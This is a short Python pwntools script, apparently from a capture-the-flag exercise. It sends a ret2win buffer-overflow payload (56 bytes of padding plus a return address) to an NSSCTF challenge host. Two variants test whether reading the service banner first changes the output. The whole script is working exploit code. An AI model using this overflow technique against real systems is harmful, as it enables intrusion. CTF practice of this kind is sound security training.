#!/usr/bin/env python3
"""诊断: 生成 exp 无输出 vs verify_remote 有输出 — banner 消费时序?"""
from pwn import *

context.log_level = 'info'
HOST, PORT = "node4.anna.nssctf.cn", 21468
PADDING, WIN = 56, 0x4006be

# 变体 A: 完全复刻生成 exp (连接即发)
io = remote(HOST, PORT)
payload = b'A' * PADDING + p64(WIN)
io.sendline(payload)
print("=== A: 直接发, recvall ===")
print(io.recvall(timeout=5).decode(errors='replace'))
io.close()

# 变体 B: 先收 banner 再发
io = remote(HOST, PORT)
io.recvuntil(b"Let's guess the number.")
io.sendline(payload)
print("=== B: 先收 banner 再发 ===")
print(io.recvall(timeout=5).decode(errors='replace'))
io.close()
